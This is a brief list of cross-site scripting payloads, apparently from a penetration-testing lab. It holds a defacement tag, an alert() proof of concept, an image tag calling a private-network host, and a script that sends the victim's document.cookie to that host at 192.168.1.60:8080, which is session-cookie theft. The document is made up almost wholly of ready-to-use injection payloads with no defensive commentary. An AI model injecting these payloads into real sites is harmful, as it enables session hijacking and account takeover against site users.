Payloads
<marquee>PWNED</marquee>
<script>alert("XSS");</script>
<img src="http://192.168.1.60:8080">
<script>fetch("http://192.168.1.60:8080?cookie=" + document.cookie)</script>